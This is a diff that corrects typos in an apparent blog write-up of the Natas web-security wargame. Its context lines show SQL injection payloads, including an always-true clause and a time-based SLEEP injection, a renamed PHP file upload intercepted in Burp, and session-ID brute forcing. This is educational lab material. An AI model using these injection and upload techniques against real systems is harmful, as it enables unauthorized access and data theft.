+&lt;p&gt;The first two levels start with a simple HTML page. No hints.&lt;/p&gt;
 &lt;p&gt;Obviously, the first thing we do is ti take a look  at the source code.&lt;/p&gt;
 &lt;p&gt;In the 0th level, the password is straight from the there.&lt;/p&gt;
 &lt;p&gt;In the first level, we need to  disable  &lt;strong&gt;JavaScript&lt;/strong&gt; so you can right click it:&lt;/p&gt;
@@ -762,9 +762,9 @@ chmod +x date
 &lt;p&gt;Looking at the content of  the folder &lt;em&gt;/s3cr3t/&lt;/em&gt; revels:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;Index&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;s3cr3t&lt;/span&gt;
 
-&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;ICO&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;Name&lt;/span&gt;    &lt;span class="n"&gt;Last&lt;/span&gt; &lt;span class="n"&gt;modified&lt;/span&gt;   &lt;span class="n"&gt;Size&lt;/span&gt;    &lt;span class="n"&gt;Description&lt;/span&gt;
-&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="kt"&gt;DIR&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;Parent&lt;/span&gt; &lt;span class="n"&gt;Directory&lt;/span&gt;        &lt;span class="o"&gt;-&lt;/span&gt;
-&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;TXT&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;   &lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Jul&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;2013&lt;/span&gt; &lt;span class="mi"&gt;13&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;35&lt;/span&gt;   &lt;span class="mi"&gt;40&lt;/span&gt;
+&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;ICO&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;    &lt;span class="n"&gt;Name&lt;/span&gt;    &lt;span class="n"&gt;Last&lt;/span&gt; &lt;span class="n"&gt;modified&lt;/span&gt;    &lt;span class="n"&gt;Size&lt;/span&gt;    &lt;span class="n"&gt;Description&lt;/span&gt;
+&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="kt"&gt;DIR&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;    &lt;span class="n"&gt;Parent&lt;/span&gt; &lt;span class="n"&gt;Directory&lt;/span&gt;         &lt;span class="o"&gt;-&lt;/span&gt;
+&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;TXT&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;    &lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;    &lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Jul&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;2013&lt;/span&gt; &lt;span class="mi"&gt;13&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;35&lt;/span&gt;    &lt;span class="mi"&gt;40&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -973,7 +973,7 @@ Output:
 
 
 &lt;p&gt;We know our way now.&lt;/p&gt;
-&lt;p&gt;We then have this XOR function that take an input value, &lt;em&gt;$text&lt;/em&gt;, and XOR to a variable, &lt;em&gt;$key&lt;/em&gt;. So we know that XORing the output with what we sent as the input can return the content of &lt;em&gt;$key&lt;/em&gt;:&lt;/p&gt;
+&lt;p&gt;We then have this XOR function that takes an input value, &lt;em&gt;$text&lt;/em&gt;, and XOR to a variable, &lt;em&gt;$key&lt;/em&gt;. So we know that XORing the output with what we sent as the input can return the content of &lt;em&gt;$key&lt;/em&gt;:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nx"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;xor_encrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$in&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
     &lt;span class="nv"&gt;$key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;censored&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
     &lt;span class="nv"&gt;$text&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$in&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
@@ -1184,7 +1184,7 @@ Choose a JPEG to upload (max 1KB):&lt;span class="nt"&gt;&amp;lt;br/&amp;gt;&lt;
 &lt;p&gt;&lt;img alt="cyber" src="http://i.imgur.com/Au1Gimm.png" /&gt;&lt;/p&gt;
 &lt;p&gt;Back in Burp, we go to &lt;em&gt;Proxy --&amp;gt; Intercept&lt;/em&gt; and mark it ON:&lt;/p&gt;
 &lt;p&gt;&lt;img alt="cyber" src="http://i.imgur.com/FAf5Hru.png" /&gt;&lt;/p&gt;
-&lt;p&gt;In the browser, we load the Natas12 page and accept the initial intercepts (forwarding it). We upload out exploit.&lt;/p&gt;
+&lt;p&gt;In the browser, we load the Natas12 page and accept the initial intercepts (forwarding it). We upload our exploit.&lt;/p&gt;
 &lt;p&gt;Before we forward this request to the server, we open it in Burp and we change the name of the random string in &lt;em&gt;jpg&lt;/em&gt; to our &lt;em&gt;php&lt;/em&gt; exploit:&lt;/p&gt;
 &lt;p&gt;&lt;img alt="cyber" src="http://i.imgur.com/eywDMOy.png" /&gt;&lt;/p&gt;
 &lt;p&gt;The browser will return the link for the file:&lt;/p&gt;
@@ -1271,7 +1271,7 @@ Choose a JPEG to upload (max 1KB):&lt;span class="nt"&gt;&amp;lt;br/&amp;gt;&lt;
 
 
 &lt;p&gt;We want to inject stuff in the middle to make this query do &lt;em&gt;more things&lt;/em&gt;.&lt;/p&gt;
-&lt;p&gt;In SQLi, we need to take care of the &lt;strong&gt;"&lt;/strong&gt; that is automatically added in the end by the server. The simplest way to do this is by including an &lt;strong&gt;always true clause&lt;/strong&gt; in the end of everything. This can be represented by:&lt;/p&gt;
+&lt;p&gt;In SQLi, we need to take care of the &lt;strong&gt;"&lt;/strong&gt; that is automatically added in the end by the server. The simplest way to do this is by including an &lt;strong&gt;always true clause&lt;/strong&gt; at the end of everything. This can be represented by:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;OR&lt;/span&gt; &lt;span class="sc"&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;1&amp;#39;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
@@ -1293,7 +1293,7 @@ Choose a JPEG to upload (max 1KB):&lt;span class="nt"&gt;&amp;lt;br/&amp;gt;&lt;
 &lt;h3&gt;Level 15: SQL Injection II&lt;/h3&gt;
 &lt;p&gt;This level starts with a  form to check the existence of some username:&lt;/p&gt;
 &lt;p&gt;&lt;img alt="cyber" src="http://i.imgur.com/SO4K5wK.png" /&gt;&lt;/p&gt;
-&lt;p&gt;The source code is almost equal to the previous level, with exception of this part:&lt;/p&gt;
+&lt;p&gt;The source code is almost equal to the previous level, with the exception of this part:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cm"&gt;/*&lt;/span&gt;
 &lt;span class="cm"&gt;CREATE TABLE `users` (&lt;/span&gt;
 &lt;span class="cm"&gt;  `username` varchar(64) DEFAULT NULL,&lt;/span&gt;
@@ -1328,7 +1328,7 @@ Choose a JPEG to upload (max 1KB):&lt;span class="nt"&gt;&amp;lt;br/&amp;gt;&lt;
 
 
 &lt;p&gt;We can't just modify the query to return a record because it won't accept &lt;strong&gt;"&lt;/strong&gt;.&lt;/p&gt;
-&lt;p&gt;However, the additional information about the table's proprieties are enough for us! We are going to brute force it!&lt;/p&gt;
+&lt;p&gt;However, additional information about the table's proprieties is enough for us! We are going to brute force it!&lt;/p&gt;
 &lt;h4&gt;Stating the Attack:&lt;/h4&gt;
 &lt;p&gt;If we check the existence of the users &lt;em&gt;nata15&lt;/em&gt; or &lt;em&gt;natas17&lt;/em&gt;, we get:&lt;/p&gt;
 &lt;blockquote&gt;
@@ -1516,7 +1516,7 @@ Wed Oct 14 20:23:41 EDT 2014
 &lt;p&gt;What other ways we can have binary indicator?&lt;/p&gt;
 &lt;p&gt;We can play with time!&lt;/p&gt;
 &lt;h4&gt;Stating the Attack:&lt;/h4&gt;
-&lt;p&gt;Luckily, MySQL has a query &lt;a href="http://dev.mysql.com/doc/refman/5.0/en/miscellaneous-functions.html#function_sleep"&gt;sleep()&lt;/a&gt; that delays the next command for a number of seconds. We can use this as an inject command in the end of our former exploits:&lt;/p&gt;
+&lt;p&gt;Luckily, MySQL has a query &lt;a href="http://dev.mysql.com/doc/refman/5.0/en/miscellaneous-functions.html#function_sleep"&gt;sleep()&lt;/a&gt; that delays the next command for a number of seconds. We can use this as an injected command at the end of our former exploits:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;AND&lt;/span&gt; &lt;span class="n"&gt;SUBSTRING&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="n"&gt;LIKE&lt;/span&gt; &lt;span class="n"&gt;BINARY&lt;/span&gt; &lt;span class="n"&gt;AND&lt;/span&gt; &lt;span class="n"&gt;SLEEP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;AND&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;1&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
@@ -1648,7 +1648,7 @@ Wed Oct 14 20:23:41 EDT 2014
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;So, in resume, we have a function that starts the session, first checking if the session id is in the cookie and if this session id is a number. If true, it checks if it's a fresh session. Then, it checks if the word &lt;em&gt;admin&lt;/em&gt; is in &lt;a href="http://en.wikipedia.org/wiki/Session_ID"&gt;SESSION_ID&lt;/a&gt;. If not, it invalidates the session.&lt;/p&gt;
+&lt;p&gt;So, in summary, we have a function that starts the session, first checking if the session id is in the cookie and if this session id is a number. If true, it checks if it's a fresh session. Then, it checks if the word &lt;em&gt;admin&lt;/em&gt; is in &lt;a href="http://en.wikipedia.org/wiki/Session_ID"&gt;SESSION_ID&lt;/a&gt;. If not, it invalidates the session.&lt;/p&gt;
 &lt;p&gt;If the SESSION_ID is the admin session ID, the password for the next is shown.&lt;/p&gt;
 &lt;p&gt;After that, it calls PHP's &lt;a href="http://php.net/manual/en/function.session-start.php"&gt;session_starts()&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;The session ID is given by the variable &lt;em&gt;PHPSESSID&lt;/em&gt;, and that's what we are going to brute force to get our password.&lt;/p&gt;
@@ -1755,7 +1755,7 @@ Wed Oct 14 20:23:41 EDT 2014
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;And we get our password in the 501th attempt. Awesome.&lt;/p&gt;
+&lt;p&gt;And we get our password in the 501st attempt. Awesome.&lt;/p&gt;
 &lt;hr /&gt;
 &lt;p&gt;That's it. The &lt;a href="https://github.com/bt3gl/CTFs-Gray-Hacker-and-PenTesting/tree/master/Web_Exploits"&gt;source code is available&lt;/a&gt; as usual.&lt;/p&gt;
 &lt;p&gt;Hack all the things!&lt;/p&gt;
